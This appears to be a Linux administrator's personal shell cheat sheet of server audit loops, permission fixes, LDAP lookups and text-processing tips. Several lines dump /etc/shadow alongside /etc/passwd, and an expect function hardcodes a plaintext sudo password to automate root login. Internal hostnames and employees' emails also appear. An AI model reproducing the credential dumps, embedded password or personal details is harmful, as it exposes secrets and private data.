+cd /etc/cron.d;cat * |awk '{if(NF>6){print}}'|egrep -v '^#|^$'|cut -d" " -f7-|cut -d"#" -f1 |awk '{for(i=1;i<=NF;i++)if($i!~/\//){print $i}}'|grep -v '^-.*'|tr -cs "[a-z][A-Z]-" "\n"|grep -v '^ *$'|xargs which 2>/dev/null && echo "above paths needed to be added" || echo "Pass, all the commands have full path"
+
+
+ssh ausl-ra-lmcbe01 "cat /etc/passwd|awk -F: '/nologin|false/{if(\$3>499){print}}'|grep -v nfsnobody"
+for srv in `cat 1_tmp`;do echo -e "\t\t$srv";ssh $srv "cat /etc/passwd|awk -F: '/nologin|false/{if(\$3>499){print}}'|grep -v nobody";done
+
+for srv in `cat 2`;do echo -e "\t\t$srv";ssh -t $srv "sudo rpm -q vsftpd && sudo netstat -ant|grep ':21' && sudo find /etc -name *ftpusers |xargs sudo cat";done >AD.1.1.10.2
+
+for srv in `cat 2`;do echo -e "\t\t$srv";ssh -t $srv "sudo rpm -q rsyslog && sudo cat /etc/rsyslog.conf |egrep 'authpriv|ActionFileDefault'|grep -v '^#'";done >AD.1.2.1.3
+
+for srv in `cat 2`;do echo -e "\t\t$srv";ssh -t $srv "sudo rpm -q sysklogd && sudo grep authpriv /etc/syslog.conf|grep -v '^#'";done >AD.1.2.1.1
+
+for srv in `cat 2`;do echo -e "\t\t$srv";ssh $srv "grep pam_deny.so /etc/pam.d/other|egrep 'auth|account'";done >AD.1.4.1
+
+for srv in `cat 2`;do echo -e "\t\t$srv";ssh $srv "ls -l /var/log/wtmp;grep utmp /etc/group";done > AD.1.8.12.3
+
+===use color=====\033[1;40;31m============font style;background color;font color========\033[0m reset to default setting=================
+for srv in `cat 1`;do echo -e "\t\t\033[4;47;31m $srv \033[0m";ssh $srv "grep pam_deny.so /etc/pam.d/other|egrep 'auth|account'";done
+
+
+====================================================================================
+Health Check - FIX
+====================================================================================
+for srv in `cat ad.1.1.2`;do ssh -t $srv "sudo sed -i '/minlen/s/.*/password\ \ \ \ required\ \ \ \ \ \ pam_cracklib.so\ retry=3\ minlen=8\ dcredit=-1\ ucredit=0\ lcredit=-1\ ocredit=0\ type=\ reject_username/g' /etc/pam.d/system-auth";done
+
+chage -d 0 -m 0 -M 90 -W 15 root（linux）强制用户下次登陆时修改密码，并且设置密码最低有效期0和最高有限期90，提前15天发警报提示
+
+for srv in `cat ad.1.1.4.2`;do ssh -t $srv "sudo sed -i '/remember/s/8\|14\|24/7/g' /etc/pam.d/system-auth";done
+
+====================================================================================
+operate CSV
+====================================================================================
+cat SHC_Violations |awk -F "\t" '{if($NF~/^ *$/ && $5~/AD.1.1.2/) print $4,$5,$8,$9,$NF}' |awk '{print $1}'|sort -u
+
+cat SHC_Violations |awk -F "\t" '{if($NF~/^ *$/ && $5~/AD\.1\.1\.[13]*\.*2/) print $4,$5,$8,$9,$NF}' |wc -l
+
+cat SHC_Violations |awk -F "\t" '{if($NF~/^ *$/ && $5!~/AD\.1\.1\.[13]*\.*2/) print $4,$5,$8,$9,$NF}'|sort -k2,2
+
+cat SHC_Violations |awk -F "\t" '{if($NF~/^ *$/) print $4,$5}'|cut -d" " -f1,2|awk '{++AD[$NF]}END{for(key in AD)print key,"\t",AD[key]}' |sort -k2nr,2
+
+cat SHC_Violations |awk -F "\t" '{if($NF~/^ *$/) print $4,$5}'|cut -d" " -f1,2|awk '{++AD[$NF];server[$NF]=server[$NF]" "$1}END{for(key in AD)print key,"\t",AD[key],"\t",server[key]}' |sort -k2nr,2 >group1
+
+while read srv;do echo $srv|tr ' ' '\n'|grep -v '^$'|sort -u|tr '\n' ' ';echo;done< <(cat group1|awk -F "\t" '{print $3}')
+=====================================================================================
+Remove users from wheel on each servers
+=====================================================================================
+#######find users in wheel or tmpwheel group in serverlist 
+for srv in `cat mci_srvlist_valid`;do echo -n "$srv ";ssh $srv "grep 'wheel:' /etc/group|cut -d: -f4-|tr ',' ' '";done >mci_sudousers.orig
+
+######remove known users from user list 
+cat mci_sudousers.orig |sed -e 's/jintaoxu//g' -e 's/chzhbo//g' -e 's/szliuysz//g' -e 's/wuyssz//g' -e 's/harryz//g' -e 's/xuhying//g' -e 's/heyongsz//g' -e 's/chensen//g' -e 's/fangang//g' -e 's/tanlong//g' -e 's/guiwanc//g' -e 's/dangcz//g' -e 's/root//g' >mci_sudousers     
+####manually edit file 
+
+###### regroup and output
+for i in `cat mci_sudousers|cut -d" " -f2-|tr ' ' '\n'|grep -v '^$'|sort -u|tr '\n' ' '`;do echo;echo -n "$i ";cat mci_sudousers|awk '/'"$i"'/{printf "%s\t",$1}';done;echo
+
+for i in `cat mci_sudousers|cut -d" " -f2-|tr ' ' '\n'|grep -v '^$'|sort -u|tr '\n' ' '`;do echo;echo "---------$i---------";cat mci_sudousers |awk '/\<'"$i"'\>/{printf "%s\t",$1}';done;echo
+erver/application
+for i in `cat igalist`;do echo -n $i;fc $i|grep 'Application:';done
+mysql SrvInformation -e "select SrvName,OS from SrvInfo where Account='RACV' and OS='RedHat6Server'"
+mysql SrvInformation -e "select SrvName,Application from SrvInfo"
+mysql facts -E <<< "select * from sir where SERVER_NAME= and account_name='IBMALinux'"
+mysql facts -e "select * from sir where SERVER_NAME= and account_name='IBMALinux'\G"
+
+find people
+
+###################1 regroup and generate contact.tmp
+for i in `cat mci_sudousers|cut -d" " -f2-|tr ' ' '\n'|grep -v '^$'|sort -u|tr '\n' ' '`;do echo;echo -n "$i ";cat mci_sudousers|awk '/'"$i"'/{printf "%s\t",$1}';done;echo
+###################2 grasp user and srv to check /etc/passwd  and generate mail.tmp
+while read user srv;do ssh $srv "awk '/\<'"$user"'\>/' /etc/passwd" </dev/null;done <  <(cat contact.tmp|awk '{print $1,$2}')
+
+##################generate mail list
+cat mail.tmp|cut -d: -f5|cut -d/ -f5|awk '{for(i=1;i<=NF;i++)if($i~/@/){print $i}}' |sort -u
+
+#####  find /etc/passwd record for $user in $server  do 2 for loops. Too Slow! Never use it.
+#for srv in `cat mci_srvlist_valid`;do for i in `cat mci_sudousers|cut -d" " -f2-|tr ' ' '\n'|grep -v '^$'|sort -u|tr '\n' ' '`;do ssh $srv "awk '/\<'"$i"'\>/' /etc/passwd";done;done >1.tmp
+
+============================================================================================================================================================================================
+
+
+######################################### find information#############################
+find SDM
+for i in `cat dochange`;do echo -n "$i ";fa n $i|grep _SM|grep -v SMCHGMGR;done |awk -F: '{print $2}'|grep -v '^$'|sort|uniq -c
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+find DPE and then group server by DPE  ; fa n servers                                                                                                          |
+--------------------------------------------------------------------------------------------------------------------------------------------------------------|
+for i in `cat dochange`;do echo -n $i;fc $i|grep 'DPE:';done |tee tmp_group                                                                                    |
+while read i;do echo -n "$i: ";cat tmp_group|awk '/'"$i"'/{printf "%s\t",$1}';echo;done< <(cat tmp_group|cut -d":" -f2|cut -d"/" -f1|sort -u) |tee dpe_group  |
+while read srv;do echo -e "\t\t$srv";fa n $srv;done< <(cat dpe_group|cut -d: -f2-)                                                                              |
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+find SDM and then group server by SDM ;                                                                                                                                      |
+for i in `cat dochange`;do echo -n "$i ";fa n $i|grep _SM|grep -v SMCHGMGR|cut -d: -f1;done >tmp_group                                                                       |
+for i in `cat tmp_group|cut -d" " -f2-|tr ' ' '\n'|grep -v '^$'|sort -u|tr '\n' ' '`;do echo;echo -n "$i ";cat tmp_group|awk '/'"$i"'/{printf "%s\t",$1}';done;echo         |
+                                                                                            |
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+find GHO server by SDM
+for s in `cat iga_srvlist_valid`;do a=`fc $s|grep -i sdm|grep -i "Xing Zhuang"`;[ $? -eq 0 ] && echo -en "$s  $a\n";done
+
+find server/application
+for i in `cat igalist`;do echo -n $i;fc $i|grep 'Application:';done
+mysql SrvInformation -e "select SrvName,Application from SrvInfo"
+mysql facts -E <<< "select * from sir where SERVER_NAME= and account_name='IBMALinux'"
+mysql facts -e "select * from sir where SERVER_NAME= and account_name='IBMALinux'\G"
+
+mysql SrvInformation -E <<< "select SrvName from SrvInfo where Status=\"BAU\" and SupportBy=\"CN_team\" and OS like \"%sle%\""|grep SrvName
+
+mysql> select OS,SrvName from SrvInfo where OS like "SLE%";
++-------------------+-----------------+
+| OS                | SrvName         |
++-------------------+-----------------+
+| SLES11-SP3_ppc    | g23lcihttp04    | 
+| SLES11-SP3_ppc    | g23lcihttp04i   | 
+| SLES11-SP3_x86_64 | b23leiim01      | 
+| SLES11-SP3_x86_64 | b23leirdb01     | 
+| SLES11-SP3_x86_64 | b23leiwas01     | 
+| SLES11-SP3_x86_64 | b23leiwas02     | 
+| SLES11-SP3_x86_64 | b23leiwas03     | 
+| SLES11-SP3_x86_64 | b23leiwas04     | 
+| SLES11-SP3_x86_64 | b23leiwas05     | 
+| SLES11-SP3_x86_64 | cfibml05        | 
+| SLES10-SP3_ppc    | g28lcihttp01    | 
+| SLES10-SP4_x86_64 | sbhwins01       | 
+| SLES10-SP4_x86_64 | sbhwins02       | 
+| SLES11-SP3_x86_64 | g23leiapp01     | 
+| SLES11-SP3_x86_64 | g28leiapp01     | 
+| SLES10-SP3_ppc    | au02uap030ghox2 | 
+| SLES10-SP3_ppc    | au02uap033ghox2 | 
++-------------------+-----------------+
+17 rows in set (0.00 sec)
+
+find people
+ldapsearch -h bluepages.ibm.com -x -b "ou=bluepages,o=ibm.com" -s sub "(emailaddress=)"
+
+ldapsearch -h a23gsa.ibm.com -x -b "ou=gsa,o=ibm.com"  "(cn=p/tivftp/tiv_user)" uid memberUid
+ldapsearch -h a23gsa.ibm.com -x -b "ou=gsa,o=ibm.com"  "(uid=frankxu)"
+ldapsearch -h a23gsa.ibm.com -x -b "ou=gsa,o=ibm.com"  "(cn=p/tivftp/tiv_user)" uid memberUid|egrep 'frankxu|tiv_user'
+ldapsearch -h a23gsa.ibm.com -x -b "ou=gsa,o=ibm.com" "(cn=Manager)"
+ldapdelete -h a23gsa.ibm.com -x -D "cn=manager,ou=Group,ou=gsa,o=ibm.com"  -W "uid=frankxu,ou=People,ou=gsa,o=ibm.com"
+
+
+find hardware
+for srv in `cat 1_hardware`;do echo $srv;ssh -t $srv "sudo /usr/sbin/dmidecode |grep -A5 \"Memory Device\$\"|grep Size";done                 -Memory
+
+find people
+[chensen@cfibml08 ~]$ cat 1
+wheel:x:10:heyongsz,taoran,fangang,guiwanc,xuhying,dangcz,wuyssz,tanlong,chensen,azdudeku,gumj
+[chensen@cfibml08 ~]$ cat 1|tr -cs "[a-z]" "\n"|sed -n '3,$p'
+heyongsz
+taoran
+
+[chensen@cfibml08 ~]$ for u in `!!`;do ff -u $u |grep @;done
+for u in `cat 1|tr -cs "[a-z]" "\n"|sed -n '3,$p'`;do ff -u $u |grep @;done
+Email Address: heyongsz@cn.ibm.com
+Notes Mail   : Yong KH He/China/IBM@IBMCN
+Comments     : sysid -u heyongsz -c "672/I/049757/IBM/He.Yong heyongsz@cn.ibm.com" -s
+Email Address: taoran@cn.ibm.com
+Notes Mail   : Ran R Tao/China/Contr/IBM@IBMCN
+Comments     : sysid -u taoran -c "672/E/AVG37E/Wistroni/Tao.Ran taoran@cn.ibm.com" -s
+
+##################format output of df -h
+for fs in `df -h|egrep '[0-9]M|[0-9]G|[0-9]T'|awk '{print $NF}'`;do echo `df -h $fs`|awk '{printf("%-50s %-8s %-8s %-8s %-8s %s\n",$8,$9,$10,$11,$12,$NF)}';done
+
+############################rename bad named file by inode name##############
+find . -inum 2324380 -exec mv {} sdm_iga \;
+find . -size +1G -exec ls -lh {} \;
+sudo find . -size +50M|xargs ls -lh
+find . -name "IBM*mef3" -print0|xargs -0 rm -f
+find . -name "*.mef3" -print0|xargs -0 -tI{} mv {} {}.bak
+
+cat BAU|xargs -n1 -P5 -i{} ssh {} uptime
+echo -e b28leidbp0{5..8}"\n"|xargs -n1 -P4 -i{} ssh {} "uname -n"
+seq 5 8|xargs -P4 -i{} ssh b28leidbp0{} ip a
+
+find . -nouser -print0|xargs -0 chmod 0755
+find . -nouser -print0|xargs -0 chown -R root.root
+echo "1 2 3 4"|xargs -n2
+echo "1 2 3 4"|xargs -n1
+ls *.tar.gz|xargs -n1 tar tvfz
+find / \( -path /proc -o -path /sys \) -prune -o -nouser -type f -print
+pssh -h sudo_yes -t 0 -x '-t -t' "sudo sh -c 'cd /tmp;find . -type d -perm -2 -print0|xargs -0 chmod -R o-w'"
+sudo sh -c 'echo > kern'
+pssh -h srv_ep2 -t 0 -x '-t -t' --inline-stdout "sudo grep -i violation /home/chensen/EP2/EP2_Driver_V2.1.1.sh.files/2014*/*.CSV|wc -l"
+--------------------------------------------------------------------------------------------------------
+pssh -h srvlist -t 0 -x '-t -t' -p 20 "sudo sh -c 'find / -path /proc -prune -o -nouser -type f -print0|xargs -0 chmod o-w'"
+pssh -h srvlist -t 0 -x '-t -t' -p 20 "sudo sh -c 'find / -path /proc -prune -o -nouser -type f -print0|xargs -0 chown root.root'"
+pssh -h srvlist -t 0 -x '-t -t' -p 20 "sudo sh -c 'find / -path /proc -prune -o -nouser -type f -print0|xargs -0 chown root.root'"
+#######hidden file, remove world-readable########
+cd /home/chensen/EP2/EP2_Driver_V2.1.1.sh.files/201412*;grep -i violation *.CSV|grep -i hiddenfile|awk -F',' '{print $8"/"$5}'|sed 's/"//g'|xargs ls -l
+cd /home/chensen/EP2/EP2_Driver_V2.1.1.sh.files/201412*;grep -i violation *.CSV|grep -i hiddenfile|awk -F',' '{print $8"/"$5}'|sed 's/"//g'|xargs chmod o-r
+########fix  orphan files or directories
+--------------------------------------------------change owner and group for files or directories with nouser and nogroup as well------------------run first---------
+sudo sh -c 'find / -xdev \( -path /proc -o -path /tmp -o -path /var/log/history -o -path /gsa \) -prune -o -nouser -a -nogroup -print0|xargs -0 ls -ld > permission.bk
+sudo sh -c 'find / -xdev \( -path /proc -o -path /tmp -o -path /var/log/history -o -path /gsa \) -prune -o -nouser -a -nogroup -type f -print0|xargs -0 chmod o-w'
+sudo sh -c 'find / -xdev \( -path /proc -o -path /tmp -o -path /var/log/history -o -path /gsa \) -prune -o -nouser -a -nogroup -type f -print0|xargs -0 chown root.root'
+sudo sh -c 'find / -xdev \( -path /proc -o -path /tmp -o -path /var/log/history -o -path /gsa \) -prune -o -nouser -a -nogroup -type d -print0|xargs -0 chown root.root'
+--------------------------------------------------change owner for files or directories only with nouser------------------------------------------run after--------
+sudo sh -c 'find / -xdev \( -path /proc -o -path /tmp -o -path /var/log/history -o -path /gsa \) -prune -o -nouser -print0|xargs -0 ls -ld >> permission.bk
+sudo sh -c 'find / -xdev \( -path /proc -o -path /tmp -o -path /var/log/history -o -path /gsa \) -prune -o -nouser -type f -print0|xargs -0 chmod o-w'
+sudo sh -c 'find / -xdev \( -path /proc -o -path /tmp -o -path /var/log/history -o -path /gsa \) -prune -o -nouser -type f -print0|xargs -0 chown root'
+sudo sh -c 'find / -xdev \( -path /proc -o -path /tmp -o -path /var/log/history -o -path /gsa \) -prune -o -nouser -type d -print0|xargs -0 chown root'
+
+#######for /opt/IBM/ITM, remove world-writeable
+sudo chmod -R o-w /opt/IBM/ITM
+
+########find world-writeable files and directories in /tmp, ignore hidden files#####
+sudo sh -c "cd /tmp;find . \( ! -regex '.*/\..*' \) -perm -2 -print"
+
+####fix secondary log file, may need on some servers####
+[chensen@cfibml08 ~]$ cat nd.sh
+#!/bin/bash
+sudo find /var/log/history -nouser -type f -print >nd.log
+for u in `cat nd.log`
+do
+sudo chattr -a $u
+sudo chown root.root $u
+sudo chattr +a $u
+done
+rm -f nd.log
+---------------------------------------------------------------------------------------------------------
+pssh -h 2 -x '-t -t' --inline-stdout "sudo sh -c 'cd /tmp;find . -type d -perm -2 -print'"
+(cd /tmp;find . \( ! -regex '.*/\..*' \) -perm -2 -print) ###don't find hidden file
+
+######################find perm prefix #########################################################################################################################
+The "-" Prefix
+If a "-" is used to prefix the mode as in:
+
+find -perm -644
+
+What this does is match files where the "read" and "write" permission bits are set for the owner, but group and other only have "read" permissions bits set.
+Any extra file mode bits are ignored. This means that files with the following permissions would match ok: 777, 776, 766, 755, 754, 744, 666, 655, 654, 644
+While files with permissions 642, 624, 622, 611, 600, 544, 543, 533, 532, 522, 521, etc ... would not match.
+So you can think of the "-" prefix as meaning "at least these bit(s) must be set for a file to match".
+The "/" Prefix
+If a "/" is used as the prefix, as in:
+
+find / -perm /222
+
+it means that a match will occur if either the owner, the group, or other have their "write" bit set.
+So you can think of it as "at least one category has at least the respective bit(s) set for a file to match".
+Examples:
+cd /tmp
+find . -type f |xargs ls -l |grep '^-......rwx'                 
+find . -type d |xargs ls -ld |grep '^d......rwx'         ####find /tmp world-writable
+find . -type d -perm -2 -print
+find . -type d -perm -0002 -print
+find . -type d -perm /2 -print
+find . -type d -perm /0002 -print
+find . -type d -perm -o=w -print
+find . -type d -perm /o=w -print
+
+###########################user administration##################################################################################################################
+usermod -aG group1 user1     add user1 to group1
+gpasswd -d user1 group1      delete user1 from group1 (redhat)
+groupmod -R user1 group1    (SUSE)
+groupmod -A user1 group1    (SUSE)
+
+############################ tr sort uniq ###############################
+tr [options]   [source-char-list]        [replace-char-list]      <    filename
+－c：   取source-char-list的反义，所有不在source-char-list中的字符。常与-d , -s配合使用。
+－d：   删除source-char-list中所定义的字符。
+－s：   浓缩重复的字符。如果标准输入中连续重复出现source-char-list里所列的字符，则将其浓缩成一个。或者将其浓缩成replace-char-list中的字符。
+tr '\n' ' ' <filename
+tr -d '\n' <filename
+</dev/urandom tr -cd [:alnum:]|head -c8           给字母数字取反，然后删掉非字母数字
+tr -s ' ' ' ' 把多个空格转换成单个空格  或者 tr -s ' '
+tr -s "\n" < plane.txt
+tr -s "[a-z][A-Z]" < apps.txt   压缩    And the cowwwwws went homeeeeeeeeeeeee  -->And the cows went home
+tr -cs "[a-z][A-Z]" "\n" < diray.txt 
+monday 9:40					monday
+Tuesday 15:00					Tuesday
+wednesday 15:30                ---->		wednesday
+thurday 10:30					thurday
+Friday 09:20 					Friday
+------------------------------------------------------------------
+echo `cat filename`
+cat /etc/passwd|cut -d: -f1,3|sort -n -k2,2 -t:
+sort -t ‘ ‘ -k 3nr -k 2n facebook.txt  
+uniq -f 2 -s 2 test ###ignore first 2 fields and first 1 space character and 1 following character
+sort -u  = sort|uniq
+#########################useful commands###################################
+pr -mJ -t /etc/shadow /etc/passwd   ####print all files in parallel, one in each column, merge full lines
+paste /etc/shadow /etc/passwd      #####Merge files, joining line by line horizontally.
+ssh user@host cat /path/to/remotefile | diff /path/to/localfile -   ####Compare a remote file with a local file
+diff <(ssh user@host cat /path/to/remotefile) /path/to/localfile    ####Compare a remote file with a local file
+echo "uname -n" | tee >(ssh orac1a) >(ssh orac1b) >(ssh orac2a)
+grep -w "model name" /proc/cpuinfo|cut -d: -f2- |tee >(uniq) >(wc -l) >/dev/null  ## can add "|sort" if need an wanted results
+ <1 tee >(wc -l) >(grep 5) >/dev/null
+{ { <file.txt tee /dev/fd/3 | grep LITERAL >&4; } 3>&1 | wc -l ;} 4>&1
+du -shx *|sort -rh|head -10      ####sort -rh  very useful
+sort -g  ### sort by numerical value
+cp foo{,.bak}   ####quick copy
+
+convert label:"$(free -m)" mem.jpg  ##### convert output
+ifconfig |convert label:@- ip.png    ####  to picture
+cat ssotools02.txt|tr '\t' "    "|convert label:@- ssotools02.png      ##avoid ???
+
+sudo !!     ####run the last command as root
+(cd /tmp && ls)  or (cd Test;ls)   ####Jump to a directory, execute a command and jump back to current dir
+###shows which files differ in two direcories
+rsync -avz --dry-run /somewhere/source_directory /somewhereelse/target_directory
+diff -qr Test Sam\ Chen/ |sort -k3,3
+
+echo -en "\r666\b\b\b";sleep 1;echo -en "\r777\b\b\b";sleep 1;echo -en "\r888\b\b\b";sleep 1
+printf '\e[1;34m%-6s\e[m' "This is text"
+printf "%b" "\e[1;34mThis is a blue text.\e[0m"
+
+################advance in bash shell################
+[chensen@cfibml08 ~]$ grep kr iga_srvlist_valid 
+krsyslog
+kr02uap001ghor2
+kr02uap002ghor2
+[chensen@cfibml08 ~]$ !!:s/kr/hk/
+grep hk iga_srvlist_valid 
+hkissi01
+[chensen@cfibml08 ~]$ ^hk^kr
+grep kr iga_srvlist_valid 
+krsyslog
+kr02uap001ghor2
+kr02uap002ghor2
+[chensen@cfibml08 ~]$ echo -n "vader ";ssh vader "date"
+vader Wed Apr 16 18:52:23 EST 2014
+[chensen@cfibml08 ~]$ !!:gs/vader/cfibml05/
+echo -n "cfibml05 ";ssh cfibml05 "date"
+cfibml05 Wed Apr 16 18:53:45 EST 2014
+
+---------
+    ^w erase word
+    ^u erase from here to beginning of the line (I use this ALL the time.)
+    ^a move the cursor to the beginning of the line
+    ^e move the curor to the end of the line
+--------
+h   #Remove a trailing file name component, leaving only the head.
+t   #Remove all leading file name components, leaving the tail.
+r   #Remove a trailing suffix of the form .xxx, leaving the basename.
+e   #Remove all but the trailing suffix. 
+
+[sam@oc1181188062 ~]$ echo http://www.example.com/path/file.tar.gz
+http://www.example.com/path/file.tar.gz
+[sam@oc1181188062 ~]$ pwd
+/home/sam
+[sam@oc1181188062 ~]$ mkdir !-2$:t:r:r
+mkdir file
+[sam@oc1181188062 ~]$ cd !$
+cd file
+
+[sam@oc1181188062 ~]$ echo cd file
+cd file
+[sam@oc1181188062 ~]$ !*
+cd file
+[sam@oc1181188062 file]$ 
+
+#######################awk###############################################
+netstat -n | awk '/^tcp/ {++state[$NF]} END {for(key in state) print key,"\t",state[key]}'
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[chensen@cfibml08 tmp]$ cat 1
+racv-l308						 .   /opt/IBM/ITM/logs/itm_config.log.
+racv-l308						 .   /opt/IBM/ITM/logs/itm_config.trc.
+racv-l308						 .   /opt/IBM/ITM/logs/itm_synclock.trc
+racv-l309						 .   /opt/IBM/ITM/config/lz.shl.
+racv-l309						 .   /opt/IBM/ITM/logs/itm_config.log.
+racv-l309						 .   /opt/IBM/ITM/logs/itm_config.trc.
+racv-l309						 .   /opt/IBM/ITM/logs/itm_synclock.trc
+racv-l310						 .   /opt/IBM/ITM/config/lz.shl.
+racv-l310						 .   /opt/IBM/ITM/logs/itm_config.log.
+racv-l310						 .   /opt/IBM/ITM/logs/itm_config.trc.
+racv-l310						 .   /opt/IBM/ITM/logs/itm_synclock.trc
+racv-l506						 .   /opt/IBM/ITM/config/lz.shl.
+racv-l506						 .   /opt/IBM/ITM/logs/itm_config.log.
+racv-l506						 .   /opt/IBM/ITM/logs/itm_config.trc.
+racv-l506						 .   /opt/IBM/ITM/tmp/.ul.rc.
+racv-l506						 .   /opt/IBM/InstallationManager/eclipse/jre_6.0.0.sr9_20110208_03/jre/lib/tzmappings
+racv-l507						 .   /opt/IBM/ITM/config/lz.shl.
+racv-l507						 .   /opt/IBM/ITM/logs/itm_config.log.
+racv-l507						 .   /opt/IBM/ITM/logs/itm_config.trc.
+racv-l507						 .   /opt/IBM/ITM/logs/itm_synclock.trc.
+
+
+s_uptime=`sed -n '/uptime/,/space/p' ${log} |awk '/au04/{print substr($1,1,length($1)-1)}'|sort -u`
+s_backup=`sed -n '/TSM/,/Finished/p' ${log} |awk '/au04/{print substr($1,1,length($1)-1)}'|sort -u`
+
+[chensen@cfibml08 tmp]$ cat 1|awk '/\.$/{print $1,substr($NF,1,length($NF)-1);next}{print $1,$NF}'
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+[chensen@cfibml08 tmp]$ head id1
+racv-l308	adm
+racv-l308	bin
+racv-l308	daemon
+racv-l308	ftp
+racv-l308	gopher
+racv-l308	mail
+racv-l308	nobody
+racv-l308	operator
+racv-l308	rvaipat1
+racv-l308	rvaipat2
+[chensen@cfibml08 tmp]$ cat id1|awk '{server[$1]=server[$1]" "$2}END{for(name in server)print name,"\t",server[name]}'
+racv-l308 	  adm bin daemon ftp gopher mail nobody operator rvaipat1 rvaipat2 uucp wasexe8
+racv-l309 	  actifio2 adm bin cuswbapp daemon db2inst1 db2inst2 febuser1 febuser2 ftp fts_user gopher mail nobody operator rvaipat1 rvaipat2 uucp wpdbusr1 wpdbusr2
+racv-l511 	  adm avahi bin daemon dbus ftp gopher haldaemon halt mail news nobody nscd ntp operator pcap postfix rpcuser rvaipat1 rvaipat2 shutdown sshd sync uucp vcsa xfs
+
+[sam@oc1181188062 Test]$ cat web
+web01[192.168.2.100]
+httpd ok
+tomcat ok
+sendmail ok
+web02[192.168.2.101]
+httpd ok
+postfix ok
+web03[192.168.2.102]
+mysqld ok
+httpd ok
+[sam@oc1181188062 Test]$ cat web|awk '/web/{T=$0;next}{print T":\t"$0}'
+web01[192.168.2.100]:	httpd ok
+web01[192.168.2.100]:	tomcat ok
+web01[192.168.2.100]:	sendmail ok
+web02[192.168.2.101]:	httpd ok
+web02[192.168.2.101]:	postfix ok
+web03[192.168.2.102]:	mysqld ok
+web03[192.168.2.102]:	httpd ok
+[sam@oc1181188062 Test]$ cat web|awk '/web/{T=$0;getline;S=$0;getline;R=$0;print T": "S" "R}'
+web01[192.168.2.100]: httpd ok tomcat ok
+web02[192.168.2.101]: httpd ok postfix ok
+web03[192.168.2.102]: mysqld ok httpd ok
+
+[sam@oc1181188062 Test]$ paste 10 11|awk '{print $1,$2,$4}'
+[sam@oc1181188062 Test]$ awk 'NR==FNR{s[$1]=$2;next}{print $0,s[$1]}' 10 11
+[sam@oc1181188062 Test]$ sudo awk -F: 'NR==FNR{u[$1]=$4":"$5;next}{print $0":"u[$1]}' /etc/shadow /etc/passwd
+next在多行合并，以及选择性输出方面很方便
+##############sed###########################################################  
+sed '/^ *$/d' file 
+sed -i.18Mar2014 '/^ *$/d' test
+
+
+
+[sam@oc1181188062 proc]$ sed -n 's/cpu \+//p' stat
+[sam@oc1181188062 proc]$ a=cpu;sed -n 's/'$a' \+//p' stat
+1424233 1104 129746 3567565 105602 537 567 0 1178159
+
+[sam@oc1181188062 ~]$ awk '{print $NF}' 1.txt
+2.6.18-371.6.1.el5.x86_64
+2.6.18-371.el5.x86_64
+[sam@oc1181188062 ~]$ awk '{print $NF}' 1.txt|sed 's/_\|-\|\./ /g'
+2 6 18 371 6 1 el5 x86 64
+2 6 18 371 el5 x86 64
+[sam@oc1181188062 ~]$ awk '{print $NF}' 1.txt|tr -cs "[0-9][a-z]\n" " "
+
+[sam@oc1181188062 ~]$ cat 1.txt|awk '/http|core/{print $0}'
+#################Manipulating Strings#######################################
+
+[sam@oc1181188062 ~]$ a=`grep "model name" /proc/cpuinfo|uniq|cut -d: -f2`;echo ${a:1:26}
+Intel(R) Core(TM) i5-2540M
+
+[sam@oc1181188062 ~]$ grep "model name" /proc/cpuinfo|uniq
+model name	: Intel(R) Core(TM) i5-2540M CPU @ 2.60GHz
+[sam@oc1181188062 ~]$ grep "model name" /proc/cpuinfo|uniq|awk -F: '{gsub(/\(TM\)/,"");gsub(/\(R\)/,"");print $2}'
+ Intel Core i5-2540M CPU @ 2.60GHz
+############function in .bashrc#############################################
+function ff(){
+key=$1;value=$2
+key=${key/sn/uid}
+key=${key/user/primaryuserid}
+value=${value/-/}
+if [ $# != 2 ]; then  
+echo "Usage: ff sn 071940-672/071940672"
+echo "       ff user chensen"
+echo "       ff mail chensen@cn.ibm.com"
+else
+ldapsearch -h bluepages.ibm.com -x -b "ou=bluepages,o=ibm.com" -s sub "($key=$value)"|egrep '^uid|^mail|^notesEmail|^job|^tieline|^tele|^iptel|^build|^floor|^timestampHRMS|^manager:'|sed -e 's/OU=//' -e 's/O=//' -e 's/CN=//'
+fi
+}
+---------------------------------------
+fnologin ()
+{
+srv=$1
+shift
+until [ $# -eq 0 ]
+do
+ssh $srv "cat /etc/passwd|grep $1|grep -v bash"
+shift
+done
+}
+
+fnologin2 ()
+{
+sudo cat /etc/shadow /etc/passwd|sort -t: -k1,1|sed '$!N;s/\n/\t/'|grep -v ':90:' |egrep -v ':!!:|:\*:' |grep -v ':!:'
+}
+------------------------------------------
+checkid ()
+{
+srv=$1
+id=""
+shift
+until [ $# -eq 0 ]
+do
+id=$id" "$1
+shift
+done
+echo $id|xargs -n1 >tmp.1
+sed -i 's/.*/^&:/g' tmp.1
+ssh -t $srv "sudo paste /etc/passwd /etc/shadow" </dev/null |grep -f tmp.1|awk '{print a,"@",$0}' a=$srv
+rm -f tmp.1
+}
+
+CHECKID ()
+{
+while read LINE
+do
+checkid $LINE
+done <$1
+}
+
+
+---------------------------------------
+bj ()
+{
+local OPTIND
+while getopts "lr" Option
+do
+case $Option in
+l) shift;comm -23 <(sort $1) <(sort $2);;
+r) shift;comm -13 <(sort $1) <(sort $2);;
+\?) echo "arguments only accept l and r"
+   exit 1;;
+esac
+done
+}
+
+----------------------------------------
+sshdbsk ()
+{
+server="$1"
+cmd="$2"
+pass="4DT91@775"
+
+expect -c "
+set timeout 5
+spawn ssh -t $server sudo su -
+expect {
+        \"*assword*\" {send \"$pass\r\";}
+       }
+expect \"root\";
+send \"$cmd\r\";
+expect eof "
+}
+
+function aparlist(){
+until [ $# -eq 0 ]
+do
+cat $1.*apar|egrep -v 'DUE|^-'| sed 's/^.*/'$1':  &/g'
+shift
+done
+}
+
+#######################generate mef3 files####################################
